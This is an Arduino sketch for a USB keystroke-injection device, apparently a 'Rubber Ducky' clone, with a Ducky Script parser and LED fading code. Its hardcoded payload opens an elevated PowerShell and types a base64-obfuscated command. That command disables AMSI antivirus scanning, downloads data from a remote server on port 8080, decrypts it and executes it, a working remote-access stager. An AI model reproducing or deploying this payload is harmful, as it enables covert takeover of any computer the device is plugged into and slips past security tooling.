/**********************************************************/
/* [+] Title:   Arduino Ducky Script Interpreter          */
/* [+] Author:  Baptiste M. (Creased)                     */
/* [+] Website: bmoine.fr                                 */
/* [+] Twitter: @Creased_                                 */
/**********************************************************/

/**
 * Libraries
 **/
// Keyboard Message
#include <Keyboard.h>
#include <HID.h>

/**
 * Variables
 **/
#define KEY_MENU          0xED
#define KEY_PAUSE         0xD0
#define KEY_NUMLOCK       0xDB
#define KEY_PRINTSCREEN   0xCE
#define KEY_SCROLLLOCK    0xCF
#define KEY_SPACE         0xB4
#define KEY_BACKSPACE     0xB2

/**
 * Uses the FemtoUSB (Atmel SAM D21, E variant) with onboard 
 * RGB LED (OSRAM LRTB R48G) to fade between different colours.
 * 
 * See http://stackoverflow.com/questions/15803986/fading-arduino-rgb-led-from-one-color-to-the-other
 **/
class rgb_color {
    private:
        int my_r;
        int my_g;
        int my_b;
    public:
        rgb_color (int red, int green, int blue)
            :
                my_r(red),
                my_g(green),
                my_b(blue)
        {
        }
        int r() const {return my_r;}
        int b() const {return my_b;}
        int g() const {return my_g;}
};

/**
 * Fade between two colors
 */
class fader {
    private:
        int r_pin;
        int g_pin;
        int b_pin;
    public:
        /**
         * Construct the fader for the pins to manipulate.
         * make sure these are pins that support Pulse
         * width modulation (PWM), these are the digital pins
         * denoted with a tilde(~) common are ~3, ~5, ~6, ~9, ~10 
         * and ~11 but check this on your type of arduino. 
         */ 
        fader(int red_pin, int green_pin, int blue_pin)
            :
                r_pin(red_pin),
                g_pin(green_pin),
                b_pin(blue_pin)
        {
        }
        void fade(const rgb_color& in, const rgb_color& out, unsigned n_steps = 256, unsigned time = 10) {
            int red_diff = out.r() - in.r();
            int green_diff = out.g() - in.g();
            int blue_diff = out.b() - in.b();
            for (unsigned i = 0; i < n_steps; ++i) {
                // Output is the color that is actually written to the pins
                // and output nicely fades from in to out.
                rgb_color output (in.r() + i * red_diff / n_steps,
                                  in.g() + i * green_diff / n_steps,
                                  in.b() + i * blue_diff/ n_steps);

                // Put the analog pins to the proper output.
                if (output.r() > 0) {
                    analogWrite(r_pin, 255 - output.r());
                }

                if (output.g() > 0) {
                    analogWrite(g_pin, 255 - output.g());
                }

                if (output.b() > 0) {
                    analogWrite(b_pin, 255 - output.b());
                }

                delay(time);
            }
        }
};

/**
 * Initialize fader and colors
 **/
fader f (4, 3, 10);

rgb_color yellow (255, 128, 0);
rgb_color orange (255, 32, 0);
rgb_color red (255, 0, 0);
rgb_color cyan (0, 128, 255);
rgb_color blue (0, 0, 255);
rgb_color purple (128, 0, 255);
rgb_color pink (255, 0, 255);
rgb_color green (0, 255, 0);
rgb_color white (0, 0, 0);

/**
 * Functions
 **/
void setup() {
    // LED blinking
    for (int i=0; i < 2; i++) {
        f.fade(purple, cyan, 256, 5);
        f.fade(cyan, purple, 256, 5);
    }

    // Initialize control over keyboard
    Keyboard.begin();

    // Arducky payload (set NULL as last value!)
    char *payload[] = {
        "DELAY 1500",
        "GUI r",
        "DELAY 500",
        "STRING powershell.exe Start-Process powershell.exe -Verb RunAs",
        "ENTER",
        "DELAY 1500",
        "STRING powershell -noP -sta -w 1 -enc WwBSAGUAZgBdAC4AQQBzAFMARQBNAEIAbAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5",
        "STRING AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACc",
        "STRING AKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZA",
        "STRING AnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAFUAZQAoACQAbgBVAEwAbAAsA",
        "STRING CQAVAByAHUAZQApAH0AOwBbAFMAWQBTAFQARQBNAC4ATgBFAHQALgBTAEUAcgB2AGkAYwBlAFAATwBJAG4AdABNAGEAbgBBAGcA",
        "STRING RQBSAF0AOgA6AEUAWABwAEUAYwBUADEAMAAwAEMAbwBOAHQAaQBOAFUARQA9ADAAOwAkAHcAYwA9AE4ARQB3AC0ATwBCAEoAZQB",
        "STRING DAFQAIABTAFkAUwB0AEUATQAuAE4ARQB0AC4AVwBFAEIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC",
        "STRING 4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AM",
        "STRING AA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAYQBEAGUAcgBTAC4AQQBk",
        "STRING AGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAHIATwBYAFkAPQBbAFMAeQBTAHQARQBNAC4",
        "STRING ATgBFAHQALgBXAGUAQgBSAGUAcQB1AEUAUwBUAF0AOgA6AEQAZQBGAEEAVQBMAHQAVwBlAEIAUABSAG8AWABZADsAJAB3AEMALg",
        "STRING BQAHIAbwBYAHkALgBDAHIAZQBEAEUAbgBUAEkAYQBMAFMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4ARQBUAC4AQwByAEUARABFA",
        "STRING E4AVABJAEEAbABDAGEAYwBIAEUAXQA6ADoARABFAGYAYQBVAEwAVABOAEUAVAB3AG8AcgBLAEMAcgBlAGQARQBuAHQASQBBAGwA",
        "STRING cwA7ACQASwA9AFsAUwBZAHMAdABlAE0ALgBUAEUAWABUAC4ARQBOAEMATwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB",
        "STRING 0AEIAeQB0AGUAcwAoACcASwBBAE4AcwAjADgAJQBtAHAAWgBpAGQAUABTAEwAaABhAF0AZwBWAFsAWQAuAEcAPwBuAGsAfQBGAG",
        "STRING MALwAzACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUAN",
        "STRING QB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2",
        "STRING ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEk",
        "STRING APQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQ",
        "STRING AsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAFIAJABTAFsAKAAkAFMAWwAkA",
        "STRING EkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBDAC4ASABFAGEARABFAHIAcwAuAEEARABEACgAIgBDAG8A",
        "STRING bwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AMgBtADAARQB6AEsALwBlAEEATQBTAE4AbQAxAEIAaABlAEYAUwBEAGYAZAB",
        "STRING 3AE0AaQBxAFEAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAHYAcABzADIALgBiAG0AbwBpAG4AZQAuAGYAcgA6AD",
        "STRING gAMAA4ADAAJwA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAGQAQQB0AGEAPQAkAFcAQwAuAEQAT",
        "STRING wBXAE4AbABvAEEAZABEAGEAdABhACgAJABzAGUAUgArACQAVAApADsAJABJAFYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAk",
        "STRING AGQAYQBUAEEAPQAkAEQAQQB0AEEAWwA0AC4ALgAkAEQAQQB0AGEALgBMAEUATgBnAHQAaABdADsALQBKAG8ASQBOAFsAQwBIAGE",
        "STRING AcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
        "ENTER",
        NULL
    };

    // Process Arducky payload
    String line = "";
    for (int i=0; payload[i] != NULL; i++) {  // For each line in buffer
        line = payload[i];  // Get line from payload
        processLine(line);  // Process script line by reading command and payload
    }

    // LED blinking
    for (int i=0; i <= 25; i++) {
        f.fade(white, yellow, 255, 1);
        f.fade(yellow, white, 255, 1);
        delay(100);
    }

    // End control over keyboard
    Keyboard.end();
}

void processLine(String line) {
    /*
     * Process Ducky Script according to the official documentation (see https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript).
     *
     * (1) Commands without payload:
     *  - ENTER
     *  - MENU <=> APP
     *  - DOWNARROW <=> DOWN
     *  - LEFTARROW <=> LEFT
     *  - RIGHTARROW <=> RIGHT
     *  - UPARROW <=> UP
     *  - BREAK <=> PAUSE
     *  - CAPSLOCK
     *  - DELETE
     *  - END
     *  - ESC <=> ESCAPE
     *  - HOME
     *  - INSERT
     *  - NUMLOCK
     *  - PAGEUP
     *  - PAGEDOWN
     *  - PRINTSCREEN
     *  - SCROLLLOCK
     *  - SPACE
     *  - TAB
     *  - REPLAY (global commands aren't implemented)
     *
     * (2) Commands with payload:
     *  - DEFAULT_DELAY <=> DEFAULTDELAY (global commands aren't implemented.)
     *  - DELAY (+int)
     *  - STRING (+string)
     *  - GUI <=> WINDOWS (+char)
     *  - SHIFT (+char or key)
     *  - ALT (+char or key)
     *  - CTRL <=> CONTROL (+char or key)
     *  - REM (+string)
     *
     */

    int space = line.indexOf(' ');  // Find the first 'space' that'll be used to separate the payload from the command
    String command = "";
    String payload = "";

    if (space == -1) {  // There is no space -> (1)
        if (
            line == "ENTER" ||
            line == "MENU" || line == "APP" |
            line == "DOWNARROW" || line == "DOWN" ||
            line == "LEFTARROW" || line == "LEFT" ||
            line == "RIGHTARROW" || line == "RIGHT" ||
            line == "UPARROW" || line == "UP" ||
            line == "BREAK" || line == "PAUSE" ||
            line == "CAPSLOCK" ||
            line == "DELETE" ||
            line == "END" ||
            line == "ESC" || line == "ESCAPE" ||
            line == "HOME" ||
            line == "INSERT" ||
            line == "NUMLOCK" ||
            line == "PAGEUP" ||
            line == "PAGEDOWN" ||
            line == "PRINTSCREEN" ||
            line == "SCROLLLOCK" ||
            line == "SPACE" ||
            line == "TAB"
        ) {
            command = line;
        }
    } else {  // Has a space -> (2)
        command = line.substring(0, space);   // Get chars in line from start to space position
        payload = line.substring(space + 1);  // Get chars in line from after space position to EOL

        if (
            command == "DELAY" ||
            command == "STRING" ||
            command == "GUI" || command == "WINDOWS" ||
            command == "SHIFT" ||
            command == "ALT" ||
            command == "CTRL" || command == "CONTROL" ||
            command == "REM"
         ) { } else {
            // Invalid command
            command = "";
            payload = "";
         }
    }

    if (payload == "" && command != "") {                       // Command from (1)
        processCommand(command);                                // Process command
    } else if (command == "DELAY") {                            // Delay before the next commande
        delay((int) payload.toInt());                           // Convert payload to integer and make pause for 'payload' time
    } else if (command == "STRING") {                           // String processing
        Keyboard.print(payload);                                // Type-in the payload
    } else if (command == "REM") {                              // Comment
    } else if (command != "") {                                 // Command from (2)
        String remaining = line;                                // Prepare commands to run
        while (remaining.length() > 0) {                        // For command in remaining commands
            int space = remaining.indexOf(' ');                 // Find the first 'space' that'll be used to separate commands
            if (space != -1) {                                  // If this isn't the last command
                processCommand(remaining.substring(0, space));  // Process command
                remaining = remaining.substring(space + 1);     // Pop command from remaining commands
            } else {                                            // If this is the last command
                processCommand(remaining);                      // Pop command from remaining commands
                remaining = "";                                 // Clear commands (end of loop)
            }
        }
    } else {
        // Invalid command
    }

    Keyboard.releaseAll();
}

void processCommand(String command) {
    /*
     * Process commands by pressing corresponding key
     * (see https://www.arduino.cc/en/Reference/KeyboardModifiers or
     *      http://www.usb.org/developers/hidpage/Hut1_12v2.pdf#page=53)
     */

    if (command.length() == 1) {     // Process key (used for example for WIN L command)
        char c = (char) command[0];  // Convert string (1-char length) to char
        Keyboard.press(c);           // Press the key on keyboard
    } else if (command == "ENTER") {
        Keyboard.press(KEY_RETURN);
    } else if (command == "MENU" || command == "APP") {
        Keyboard.press(KEY_MENU);
    } else if (command == "DOWNARROW" || command == "DOWN") {
        Keyboard.press(KEY_DOWN_ARROW);
    } else if (command == "LEFTARROW" || command == "LEFT") {
        Keyboard.press(KEY_LEFT_ARROW);
    } else if (command == "RIGHTARROW" || command == "RIGHT") {
        Keyboard.press(KEY_RIGHT_ARROW);
    } else if (command == "UPARROW" || command == "UP") {
        Keyboard.press(KEY_UP_ARROW);
    } else if (command == "BREAK" || command == "PAUSE") {
        Keyboard.press(KEY_PAUSE);
    } else if (command == "CAPSLOCK") {
        Keyboard.press(KEY_CAPS_LOCK);
    } else if (command == "DELETE" || command == "DEL") {
        Keyboard.press(KEY_DELETE);
    } else if (command == "END") {
        Keyboard.press(KEY_END);
    } else if (command == "ESC" || command == "ESCAPE") {
        Keyboard.press(KEY_ESC);
    } else if (command == "HOME") {
        Keyboard.press(KEY_HOME);
    } else if (command == "INSERT") {
        Keyboard.press(KEY_INSERT);
    } else if (command == "NUMLOCK") {
        Keyboard.press(KEY_NUMLOCK);
    } else if (command == "PAGEUP") {
        Keyboard.press(KEY_PAGE_UP);
    } else if (command == "PAGEDOWN") {
        Keyboard.press(KEY_PAGE_DOWN);
    } else if (command == "PRINTSCREEN") {
        Keyboard.press(KEY_PRINTSCREEN);
    } else if (command == "SCROLLLOCK") {
        Keyboard.press(KEY_SCROLLLOCK);
    } else if (command == "SPACE") {
        Keyboard.press(KEY_SPACE);
    } else if (command == "BACKSPACE") {
        Keyboard.press(KEY_BACKSPACE);
    } else if (command == "TAB") {
        Keyboard.press(KEY_TAB);
    } else if (command == "GUI" || command == "WINDOWS") {
        Keyboard.press(KEY_LEFT_GUI);
    } else if (command == "SHIFT") {
        Keyboard.press(KEY_RIGHT_SHIFT);
    } else if (command == "ALT") {
        Keyboard.press(KEY_LEFT_ALT);
    } else if (command == "CTRL" || command == "CONTROL") {
        Keyboard.press(KEY_LEFT_CTRL);
    } else if (command == "F1" || command == "FUNCTION1") {
        Keyboard.press(KEY_F1);
    } else if (command == "F2" || command == "FUNCTION2") {
        Keyboard.press(KEY_F2);
    } else if (command == "F3" || command == "FUNCTION3") {
        Keyboard.press(KEY_F3);
    } else if (command == "F4" || command == "FUNCTION4") {
        Keyboard.press(KEY_F4);
    } else if (command == "F5" || command == "FUNCTION5") {
        Keyboard.press(KEY_F5);
    } else if (command == "F6" || command == "FUNCTION6") {
        Keyboard.press(KEY_F6);
    } else if (command == "F7" || command == "FUNCTION7") {
        Keyboard.press(KEY_F7);
    } else if (command == "F8" || command == "FUNCTION8") {
        Keyboard.press(KEY_F8);
    } else if (command == "F9" || command == "FUNCTION9") {
        Keyboard.press(KEY_F9);
    } else if (command == "F10" || command == "FUNCTION10") {
        Keyboard.press(KEY_F10);
    } else if (command == "F11" || command == "FUNCTION11") {
        Keyboard.press(KEY_F11);
    } else if (command == "F12" || command == "FUNCTION12") {
        Keyboard.press(KEY_F12);
    }
}

void loop() {
    // nothing happens after setup
}
